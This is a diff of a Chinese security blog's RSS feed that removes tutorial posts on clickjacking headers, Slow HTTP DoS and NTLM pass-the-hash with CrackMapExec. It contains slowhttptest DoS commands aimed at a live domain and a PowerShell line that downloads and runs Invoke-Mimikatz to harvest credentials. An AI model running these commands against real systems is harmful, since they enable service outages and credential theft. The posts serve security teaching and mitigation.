+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ curl -I http://10.211.55.12/.htaccess
+HTTP/1.1 403 Forbidden
+Date: Sat, 28 Apr 2018 02:35:22 GMT
+Content-Type: text/html; charset=iso-8859-1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 28 Apr 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/archivers/2018-04-28/1</link>
+        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-28/1</guid>
+        
+        
+        <category>Web安全测试学习手册</category>
+        
+      </item>
     
       <item>
         <title>应用程序未容错</title>
@@ -676,476 +983,6 @@ Cache-Control: private
         <pubDate>Wed, 18 Apr 2018 00:00:00 +0800</pubDate>
         <link>http://localhost:4000/archivers/2018-04-18/1</link>
         <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-18/1</guid>
-        
-        
-        <category>内网渗透</category>
-        
-      </item>
-    
-      <item>
-        <title>点击劫持：X-Frame-Options头丢失</title>
-        <description>&lt;p&gt;《Web安全测试学习手册》- 点击劫持：X-Frame-Options头丢失
-&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x00-点击劫持x-frame-options头丢失---介绍&quot;&gt;0x00 点击劫持：X-Frame-Options头丢失 - 介绍&lt;/h2&gt;
-
-&lt;h3 id=&quot;1什么是点击劫持x-frame-options头丢失&quot;&gt;1）什么是点击劫持：X-Frame-Options头丢失&lt;/h3&gt;
-
-&lt;p&gt;X-Frame-Options HTTP 响应头， 可以指示浏览器是否应该加载一个 iframe 中的页面。 网站可以通过设置 X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持。&lt;/p&gt;
-
-&lt;h3 id=&quot;2点击劫持x-frame-options头丢失的特点&quot;&gt;2）点击劫持：X-Frame-Options头丢失的特点&lt;/h3&gt;
-
-&lt;p&gt;属于一种具有迷惑性高、利用难度中等、攻击方式单一的攻击手法。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x01-点击劫持x-frame-options头丢失---风险等级&quot;&gt;0x01 点击劫持：X-Frame-Options头丢失 - 风险等级&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;中&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-点击劫持x-frame-options头丢失---原理&quot;&gt;0x02 点击劫持：X-Frame-Options头丢失 - 原理&lt;/h2&gt;
-
-&lt;p&gt;当X-Frame-Options HTTP 响应头丢失的时候，攻击者可以伪造一个页面，该页面使用前端技术精心构造一些诱惑用户点击的按钮、图片，该元素下方就是一个iframe标签，当用户点击后上层的元素后，就相当于点击了iframe标签引入的网页页面。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-点击劫持x-frame-options头丢失---常见场景&quot;&gt;0x03 点击劫持：X-Frame-Options头丢失 - 常见场景&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;默认配置的WebServer&lt;/li&gt;
-  &lt;li&gt;单一交互的网站（按钮）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;
-
-&lt;p&gt;使用CURL请求网站，查看响应头是否包含&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -I http://target
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;未修复&quot;&gt;未修复&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payloads@Online$ curl -I http://localhost
-HTTP/1.1 200 OK
-Server: nginx/1.12.1 (Ubuntu)
-Date: Mon, 16 Apr 2018 07:48:51 GMT
-Content-Type: text/html
-Content-Length: 612
-Last-Modified: Sun, 08 Apr 2018 02:41:44 GMT
-Connection: keep-alive
-ETag: &quot;5ac98168-264&quot;
-Accept-Ranges: bytes
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;不存在&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头。&lt;/p&gt;
-
-&lt;h3 id=&quot;修复后&quot;&gt;修复后&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payloads@Online$ curl -I http://localhost
-HTTP/1.1 200 OK
-Server: nginx/1.12.1 (Ubuntu)
-Date: Mon, 16 Apr 2018 07:52:08 GMT
-Content-Type: text/html
-Content-Length: 612
-Last-Modified: Sun, 08 Apr 2018 02:41:44 GMT
-Connection: keep-alive
-ETag: &quot;5ac98168-264&quot;
-X-Frame-Options: SAMEORIGIN
-Accept-Ranges: bytes
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;
-
-&lt;p&gt;配置WebServer，更改配置文件，添加自定义响应头&lt;/p&gt;
-
-&lt;p&gt;使用 X-Frame-Options 有三个可选的值：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;DENY：浏览器拒绝当前页面加载任何Frame页面&lt;/li&gt;
-  &lt;li&gt;SAMEORIGIN：frame页面的地址只能为同源域名下的页面&lt;/li&gt;
-  &lt;li&gt;ALLOW-FROM：origin为允许frame加载的页面地址&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;若网站内有使用iframe标签链接同源资源的，需要设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;SAMEORIGIN&lt;/code&gt;。&lt;/p&gt;
-
-&lt;h3 id=&quot;apache&quot;&gt;Apache&lt;/h3&gt;
-
-&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; 在所有页面上发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，需要把下面这行添加到 &lt;code class=&quot;highlighter-rouge&quot;&gt;site&lt;/code&gt; 的配置中:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Header always append X-Frame-Options SAMEORIGIN
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;
-
-&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; 发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，把下面这行添加到 &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;server&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;location&lt;/code&gt; 的配置中:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;add_header X-Frame-Options SAMEORIGIN;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;iis&quot;&gt;IIS&lt;/h3&gt;
-
-&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;IIS&lt;/code&gt; 发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，添加下面的配置到 &lt;code class=&quot;highlighter-rouge&quot;&gt;Web.config&lt;/code&gt; 文件中:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;system.webServer&amp;gt;
-  ...
- 
-  &amp;lt;httpProtocol&amp;gt;
-    &amp;lt;customHeaders&amp;gt;
-      &amp;lt;add name=&quot;X-Frame-Options&quot; value=&quot;SAMEORIGIN&quot; /&amp;gt;
-    &amp;lt;/customHeaders&amp;gt;
-  &amp;lt;/httpProtocol&amp;gt;
- 
-  ...
-&amp;lt;/system.webServer&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-</description>
-        <pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/archivers/2018-04-16/3</link>
-        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-16/3</guid>
-        
-        
-        <category>Web安全测试学习手册</category>
-        
-      </item>
-    
-      <item>
-        <title>Slow HTTP DOS</title>
-        <description>&lt;p&gt;《Web安全测试学习手册》- Slow HTTP DOS
-&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x00-slow-http-dos---介绍&quot;&gt;0x00 Slow HTTP DOS - 介绍&lt;/h2&gt;
-
-&lt;h3 id=&quot;1什么是slow-http-dos&quot;&gt;1）什么是Slow HTTP DOS&lt;/h3&gt;
-
-&lt;p&gt;Slow HTTP DOS(Slow HTTP Denial of Service Attack)，译为缓慢的HTTP拒绝服务，这类攻击方式出现在许多公开协议中。&lt;/p&gt;
-
-&lt;h3 id=&quot;2slow-http-dos的特点&quot;&gt;2）Slow HTTP DOS的特点&lt;/h3&gt;
-
-&lt;p&gt;Slow HTTP DOS是一个应用层拒绝服务攻击，主要针对协议为HTTP，攻击的成本很低，并且能够消耗服务器端资源，占用客户端连接数，导致正常用户无法连接服务器。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x01-slow-http-dos---风险等级&quot;&gt;0x01 Slow HTTP DOS - 风险等级&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;中&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-slow-http-dos---原理&quot;&gt;0x02 Slow HTTP DOS - 原理&lt;/h2&gt;
-
-&lt;p&gt;既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。&lt;/p&gt;
-
-&lt;p&gt;首先HTTP协议的报文都是一行一行的，类似于：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1\r\n
-Host : payloads.online\r\n
-Connection: keep-alive\r\n
-Keep-Alive: 900\r\n
-Content-Length: 100000000\r\n
-Content_Type: application/x-www-form-urlencoded\r\n
-Accept: *.*\r\n
-\r\n
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;那么报文中的&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;是什么？&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;代表一行报文的结束也被称为空行（CRLF），而&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n\r\n&lt;/code&gt;代表整个报文的结束&lt;/p&gt;
-
-&lt;p&gt;从上面贴出的&lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt;请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。&lt;/p&gt;
-
-&lt;p&gt;通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接&lt;code class=&quot;highlighter-rouge&quot;&gt;（HTTP协议为无连接的协议）&lt;/code&gt;；当使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Keep-Alive模式（又称持久连接、连接重用）&lt;/code&gt;时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。&lt;/p&gt;
-
-&lt;p&gt;那么当我们客户端发送一个报文，不以&lt;code class=&quot;highlighter-rouge&quot;&gt;CRLF&lt;/code&gt;结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。&lt;/p&gt;
-
-&lt;p&gt;如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-slow-http-dos---常见场景&quot;&gt;0x03 Slow HTTP DOS - 常见场景&lt;/h2&gt;
-
-&lt;p&gt;大多出现在默认安装好的Apache Web中，未合理设置客户端连接数导致的。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;
-
-&lt;p&gt;使用Slow HTTP Test 工具进行检测&lt;/p&gt;
-
-&lt;p&gt;Kali Linux 安装 ：apt-get install slowhttptest&lt;/p&gt;
-
-&lt;p&gt;SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试攻击，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。&lt;/p&gt;
-
-&lt;p&gt;这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。&lt;/p&gt;
-
-&lt;h3 id=&quot;slow-header&quot;&gt;Slow Header&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://payloads.online
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。&lt;/p&gt;
-
-&lt;h3 id=&quot;slow-read&quot;&gt;Slow Read&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://payloads.online
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。&lt;/p&gt;
-
-&lt;h3 id=&quot;slow-post&quot;&gt;Slow Post&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://payloads.online
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;1.设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;2.增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13. The old name is still supported.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;3.默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满 Apache 的所有连接&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;针对不同的Server其对慢速http拒绝服务攻击防范方法也不同，建议使用以下措施防范慢速http拒绝服务攻击：&lt;/p&gt;
-
-&lt;h3 id=&quot;websphere&quot;&gt;WebSphere&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1、限制 HTTP 数据的大小
-在WebSphere Application Server 中进行如下设置：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。&lt;/p&gt;
-
-&lt;p&gt;HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。&lt;/p&gt;
-
-&lt;p&gt;另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。&lt;/p&gt;
-
-&lt;p&gt;设置限制任何请求正文的最大大小。详见参考链接。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;2、设置keepalive参数&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。&lt;/p&gt;
-
-&lt;p&gt;这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。&lt;/p&gt;
-
-&lt;h3 id=&quot;weblogic&quot;&gt;Weblogic&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1、在配置管理界面中的协议-&amp;gt;一般信息下设置 完成消息超时时间小于400&lt;/li&gt;
-  &lt;li&gt;2、在配置管理界面中的协议-&amp;gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1、通过调整$request_method，配置服务器接受http包的操作限制；&lt;/li&gt;
-  &lt;li&gt;2、在保证业务不受影响的前提下，调整client_max_body_size, client_body_buffer_size, client_header_buffer_size,large_client_header_buffersclient_body_timeout, client_header_timeout的值，必要时可以适当的增加；&lt;/li&gt;
-  &lt;li&gt;3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；&lt;/li&gt;
-  &lt;li&gt;4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients = worker_processes * worker_connections。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;apache&quot;&gt;Apache&lt;/h3&gt;
-
-&lt;p&gt;建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：
-#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。
-RequestReadTimeout header=10-40,minrate=500
-#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。
-RequestReadTimeout body=10-40,minrate=500
-需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;2、mod_qos用于控制并发连接数。配置例如：&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;当服务器并发连接数超过600时，关闭keepalive&lt;/p&gt;
-
-&lt;p&gt;QS_SrvMaxConnClose 600&lt;/p&gt;
-
-&lt;p&gt;限制每个源IP最大并发连接数为50&lt;/p&gt;
-
-&lt;p&gt;QS_SrvMaxConnPerIP 50
-这两个数值可以根据服务器的性能调整。&lt;/p&gt;
-
-&lt;h3 id=&quot;ihs服务器&quot;&gt;IHS服务器&lt;/h3&gt;
-
-&lt;p&gt;请您先安装最新补丁包，然后启用&lt;code class=&quot;highlighter-rouge&quot;&gt;mod_reqtimeout&lt;/code&gt;模块，在配置文件中加入：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LoadModule reqtimeout_module modules/mod_reqtimeout.so
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;为&lt;code class=&quot;highlighter-rouge&quot;&gt;mod_reqtimeout&lt;/code&gt;模块添加配置：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;IfModule mod_reqtimeout.c&amp;gt;
-RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500
-&amp;lt;/IfModule&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;对于HTTPS站点，建议header=20-40,MinRate=500。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;参见：http://www-01.ibm.com/support/docview.wss?uid=swg21652165&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;f5负载均衡修复建议&quot;&gt;F5负载均衡修复建议&lt;/h3&gt;
-
-&lt;p&gt;F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。&lt;/p&gt;
-
-&lt;p&gt;关于F5的慢速攻击防护配置，请参考以下链接：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html&lt;/li&gt;
-  &lt;li&gt;https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;tomcat服务器&quot;&gt;tomcat服务器&lt;/h3&gt;
-
-&lt;p&gt;解决方案：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;1、设置Tomcat / server.xml文件    connectiontimeout 值，默认为20000ms，修改为8000ms(Tomcat 自身安全漏洞)&lt;/li&gt;
-  &lt;li&gt;2、设置AJAX的全局timeout时间（默认为30000ms） $.ajaxSetup({timeout:8000}).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;address&gt;
-感谢&lt;b&gt;&lt;a href=&quot;mailto:lyquan16@gmail.com&quot;&gt;Wingkyun&lt;/a&gt;&lt;/b&gt;给予我的修复建议&lt;br /&gt;
-&lt;/address&gt;
-
-</description>
-        <pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/archivers/2018-04-16/2</link>
-        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-16/2</guid>
-        
-        
-        <category>Web安全测试学习手册</category>
-        
-      </item>
-    
-      <item>
-        <title>使用CrackMapExec 进行 NTLM Hash传递攻击</title>
-        <description>&lt;p&gt;本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击
-&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;
-
-&lt;p&gt;早期&lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt;协议在网络上传输明文口令。后来出现 &lt;code class=&quot;highlighter-rouge&quot;&gt;LAN Manager Challenge/Response &lt;/code&gt;验证机制，简称&lt;code class=&quot;highlighter-rouge&quot;&gt;LM&lt;/code&gt;，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。&lt;/p&gt;
-
-&lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;Win2000&lt;/code&gt;开始默认协议为&lt;code class=&quot;highlighter-rouge&quot;&gt;Kerboros&lt;/code&gt;，下列情况会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM&lt;/code&gt;：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;遗留客户端或服务器需要登录到网络或本地时。&lt;/li&gt;
-  &lt;li&gt;UNIX客户端需要与NT服务器通话时。&lt;/li&gt;
-  &lt;li&gt;有正在使用验证&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM&lt;/code&gt;的服务器信息块&lt;code class=&quot;highlighter-rouge&quot;&gt;（SMB）&lt;/code&gt;后台程序的UNIX客户端时。&lt;/li&gt;
-  &lt;li&gt;也即认证方或被认证方有仅支持NTLM情况时。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;它以&lt;code class=&quot;highlighter-rouge&quot;&gt;挑战/响应（Challenge/Response）&lt;/code&gt;顺序为基础。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1.客户端发送用户名和域名到服务器。&lt;/li&gt;
-  &lt;li&gt;2.服务器转发到域控制器DC。&lt;/li&gt;
-  &lt;li&gt;3.&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;用客户端密码随机产生一个&lt;code class=&quot;highlighter-rouge&quot;&gt;8字节&lt;/code&gt;得挑战&lt;code class=&quot;highlighter-rouge&quot;&gt;（Challenge）&lt;/code&gt;，发送给服务器。&lt;/li&gt;
-  &lt;li&gt;4.服务器将挑战转发给客户端。&lt;/li&gt;
-  &lt;li&gt;5.客户端用密码经过&lt;code class=&quot;highlighter-rouge&quot;&gt;hash&lt;/code&gt;及&lt;code class=&quot;highlighter-rouge&quot;&gt;DES&lt;/code&gt;加密算法等操作得到一个加密结果响应&lt;code class=&quot;highlighter-rouge&quot;&gt;（Response）&lt;/code&gt;发送给服务器。&lt;/li&gt;
-  &lt;li&gt;6.服务器将响应转发给&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;。&lt;/li&gt;
-  &lt;li&gt;7.&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;做同样操作验证客户端响应。&lt;/li&gt;
-  &lt;li&gt;8.验证结束，返回结果通知服务器。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;0x02-ntlm对渗透的作用&quot;&gt;0x02 NTLM对渗透的作用&lt;/h2&gt;
-
-&lt;p&gt;NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。&lt;/p&gt;
-
-&lt;p&gt;最大的特点就是我们可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt;执行&lt;code class=&quot;highlighter-rouge&quot;&gt;Command&lt;/code&gt;。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-crackmapexec-介绍&quot;&gt;0x03 CrackMapExec 介绍&lt;/h2&gt;
-
-&lt;p&gt;CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。&lt;/p&gt;
-
-&lt;p&gt;WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-安装crackmapexec&quot;&gt;0x03 安装CrackMapExec&lt;/h2&gt;
-
-&lt;h3 id=&quot;kali-linux&quot;&gt;Kali Linux&lt;/h3&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install crackmapexec&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;debianubuntu&quot;&gt;Debian/Ubuntu&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install -y libssl-dev libffi-dev python-dev build-essential
-pip install crackmapexec
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x04-传递ntlm-hash执行命令&quot;&gt;0x04 传递NTLM Hash执行命令&lt;/h2&gt;
-
-&lt;h3 id=&quot;使用mimikatz获取ntlm-hash&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Mimikatz&lt;/code&gt;获取&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM Hash&lt;/code&gt;&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-PS C:\Users\administrator\Documents&amp;gt;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
-
-PS C:\Users\administrator\Documents&amp;gt;Invoke-Mimikatz
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
